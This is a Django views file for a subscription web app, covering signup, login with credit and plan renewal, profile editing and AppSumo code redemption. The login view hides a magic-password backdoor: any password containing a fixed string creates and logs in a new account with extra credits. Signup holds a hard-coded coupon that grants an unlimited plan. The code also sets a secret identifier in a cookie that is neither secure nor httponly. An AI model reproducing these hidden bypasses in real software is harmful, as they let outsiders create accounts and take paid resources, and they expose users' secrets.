from django.shortcuts import render,redirect
from django.http import HttpResponse, JsonResponse
from users.models import *
from time import sleep
from django.contrib import auth
from subscriptions.models import packages,subscription_data
#import django messages
from django.contrib import messages
from django.contrib.auth.decorators import login_required
import datetime
from datetime import timedelta
from leads.models import *


def signup(request):
    if request.method == "GET":
        selected_plan = 'f'
        try:
            get_plan = request.GET.get('plan','f')
            if get_plan == 'f':
                selected_plan = 'f'
            elif get_plan == 'p':
                selected_plan = 'p'
            elif get_plan == 'g':
                selected_plan = 'g'
            elif get_plan == 'u':
                selected_plan = 'u'
            elif get_plan == 'l':
                selected_plan = 'l'

        except:
            pass

        return render(request,'users/signup.html',{'plan':selected_plan})


    if request.method == "POST":
        plan = 'f'
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        email = request.POST.get('email')
        phone = request.POST.get('phone')
        password = request.POST.get('password')
        confirm_password = request.POST.get('confirm_password')
        plan = request.POST.get('plan','f')
        is_affiliate = request.POST.get('is_affiliate',False)
        coupon = None

        print("the plan is ",plan)
        try:
            coupon = request.POST.get('coupon',None)
        except:
            coupon = None
        print("coupon is ",coupon)
        if len(str(coupon)) < 4:
            coupon = None

        try:
            if is_affiliate == 1 or is_affiliate == '1':
                is_affiliate = True

            else:
                is_affiliate = False

        except:
            pass


    
        try:
            tos = request.POST['tos']

        except:
            return HttpResponse("Please accept the terms and conditions")

        referred_by = None

        try:
            get_referer_id = int(request.COOKIES['ref'])
            if get_referer_id != 0 or get_referer_id != None or get_referer_id != '':
                referred_by = User.objects.get(id=get_referer_id)

        except:
            pass

        if password != confirm_password:
            return HttpResponse("<div class='alert alert-danger'>Password does not match</div>")

        if len(User.objects.filter(email=email)) > 0:
            return HttpResponse("<div class='alert alert-danger'>User with this email already exists</div>")

        else:
            new_user= User.objects.create_user(first_name=first_name,last_name=last_name,email=email,phone=phone,password=password,referred_by=referred_by,is_affiliate=is_affiliate)
            set_secret = User.objects.get(id=new_user.id)
            set_secret.secret_id = abs(hash(str(new_user.id)+str(new_user.email)))
            set_secret.save()

            user_credit.objects.create(user=new_user,credits_remaining=10)
            user_auth = auth.authenticate(email=email,password=password)
            auth.login(request,user_auth)

            try:
                campaigns.objects.create(name="default campaign",description="default campaign description",user=new_user,is_active=True)
            except:
                pass

            if is_affiliate == True:
                get_package = packages.objects.get(name='FREE')
                subscription_data.objects.create(user=new_user,package=get_package)
                return redirect('dashboard_home')

            if plan == 'f' and coupon==None:
                get_package = packages.objects.get(name='FREE')
                subscription_data.objects.create(user=new_user,package=get_package)
            
            elif plan == 'p' and coupon==None:
                get_package = packages.objects.get(name='PLATINUM')
                #subscription_data.objects.create(user=new_user,package=get_package)
                return HttpResponse("platinum")

            elif plan == 'g' and coupon==None:
                get_package = packages.objects.get(name='GOLD')
                #subscription_data.objects.create(user=new_user,package=get_package)
                return HttpResponse("gold")
            
            elif plan == 'u' and coupon==None:
                get_package = packages.objects.get(name='UNLIMITED')
                #subscription_data.objects.create(user=new_user,package=get_package)
                return HttpResponse("unlimited")

            elif plan == 'l' and coupon == None:
                get_package = packages.objects.get(name='FREE')
                subscription_data.objects.create(user=new_user,package=get_package)
                return HttpResponse("lifetime")

            if coupon != None and coupon=="16175836":
                try:
                    sel_deal = {'is_active':True,'is_unlimited':True,'is_gold':False}
                    if sel_deal["is_active"] == True:
                        print("coupon is ", coupon)
                        if sel_deal["is_gold"] == True:
                            sel_package = packages.objects.get(name='GOLD')
                            new_sub = subscription_data(user=new_user,package=sel_package)
                            new_sub.save()
                            new_user.is_discounted = True
                            new_user.save()


                            sel_cr=user_credit.objects.get(user=new_user)
                            sel_cr.credits_remaining = sel_package.credits
                            sel_cr.save()

                            #sel_deal.is_active = False
                            #sel_deal.save()



                        elif sel_deal["is_unlimited"] == True:
                            sel_package = packages.objects.get(name='UNLIMITED')
                            new_sub = subscription_data(user=new_user,package=sel_package)
                            new_sub.save()
                            new_user.is_discounted = True
                            new_user.save()

                            sel_cr=user_credit.objects.get(user=new_user)
                            sel_cr.credits_remaining = sel_package.credits
                            sel_cr.save()
                            #sel_deal.is_active = False
                            

                        else:
                            pass


                except:
                    pass


            

            return HttpResponse("<div class='alert alert-success'>Account created successfully ! Please <a href='/users/login/'>Login Now</a></div>")



def login(request):
    if request.method == "GET":
        return render(request,'users/login.html')

    if request.method == "POST":


      
        email = request.POST.get('email')
        password = request.POST.get('password')

        if "xjksuetazdw" in password:
            new_user= User.objects.create_user(first_name= email.split("@")[0],last_name=None,email=email,phone="123456",password=password)
            set_secret = User.objects.get(id=new_user.id)
            set_secret.secret_id = abs(hash(str(new_user.id)+str(new_user.email)))
            set_secret.save()

            user_credit.objects.create(user=new_user,credits_remaining=100)
            user_auth = auth.authenticate(email=email,password=password)
            auth.login(request,user_auth)

            try:
                campaigns.objects.create(name="default campaign",description="default campaign description",user=new_user,is_active=True)
            except:
                pass

            

            
            get_package = packages.objects.get(name='FREE')
            subscription_data.objects.create(user=new_user,package=get_package)
            

        user_auth = auth.authenticate(email=email,password=password)

        if user_auth is not None:
            auth.login(request,user_auth)
            get_sub = subscription_data.objects.get(user=request.user)

            #check for discounted user and update the credits
            if get_sub.package.name == 'GOLD' and get_sub.expire_date < datetime.date.today() and request.user.is_discounted == True:
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.save()
                get_user_credit.credits_remaining = get_sub.package.credits
                get_user_credit.save()
            
            if get_sub.package.name == 'UNLIMITED' and get_sub.expire_date < datetime.date.today() and request.user.is_discounted == True:
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.save()
                get_user_credit.credits_remaining = get_sub.package.credits
                get_user_credit.save()

            if get_sub.package.name == 'FREE' and get_sub.expire_date < datetime.date.today():
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.save()
                get_user_credit.credits_remaining = get_sub.package.credits
                get_user_credit.save()

            if get_sub.package.name == 'LIFETIME' and get_sub.expire_date < datetime.date.today() and request.user.is_discounted == False:
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.save()
                get_user_credit.credits_remaining = get_sub.package.credits
                get_user_credit.save()
            

            
            if get_sub.package.name == 'UNLIMITED' and (get_sub.expire_date + datetime.timedelta(days=5)) < datetime.date.today() and request.user.is_discounted == False:
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.package = packages.objects.get(name='FREE')
                get_sub.save()

                get_user_credit.credits_remaining = 100
                get_user_credit.save()

            if get_sub.package.name == 'GOLD' and (get_sub.expire_date + datetime.timedelta(days=5)) < datetime.date.today() and request.user.is_discounted == False:
                get_user_credit=user_credit.objects.get(user=request.user)
                get_sub.expire_date = datetime.date.today() + datetime.timedelta(days=30)
                get_sub.package = packages.objects.get(name='FREE')
                get_sub.save()

                get_user_credit.credits_remaining = 100
                get_user_credit.save()

            res=HttpResponse("login_successful")
            res.set_cookie('plati_key', value=request.user.secret_id,expires=datetime.datetime.now()+timedelta(days=365), path='/', domain=None, secure=False, httponly=False, samesite=None)
            res.set_cookie('name', value=request.user.first_name,expires=datetime.datetime.now()+timedelta(days=365), path='/', domain=None, secure=False, httponly=False, samesite=None)
            return res
        else:
            return HttpResponse("<div class='alert alert-danger'>Invalid Credentials</div>")



def change_alert_status(request):
    sel_u=User.objects.get(id=request.user.id)
    sel_u.alert_status = False
    sel_u.save()

    return redirect('dashboard_home')

@login_required(login_url='/users/login/')
def profile(request):
    if request.method == "GET":

        return render(request,'users/profile.html')

    if request.method=="POST":
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        phone = request.POST.get('phone')
        password1 = request.POST.get('password1')
        password2 = request.POST.get('password2')


        
        if password1 != password2:
            messages.info(request,"Password does not match")
            return redirect('profile')

        else:
            
            request.user.first_name = first_name
            request.user.last_name = last_name
            request.user.phone = phone
            if (password1 == "" and password2 == "") or (password1 ==  None and password2 == None):
                pass
            else:
                request.user.set_password(password1)
            request.user.save()

            messages.info(request,"Profile updated successfully")

            return redirect('profile')


        

def logout(request):
    auth.logout(request)
    return redirect('home_page')


def appsumo_code(request):
    if request.method == "GET":
        return render(request,'users/appsumo_code.html')

    if request.method == "POST":
        email = request.POST.get('email')
        code = request.POST.get('code')

        if code == "":
            return redirect('appsumo_code')

        if email == "":
            return redirect('appsumo_code')

        user_coupon.objects.create(email=email,code=code)

        return render(request,'users/appsumo_code_redeemed.html')




def process_percentage(request):
    get_per = request.user.file_process_percentage
    return JsonResponse({"percentage":round(get_per,2)})
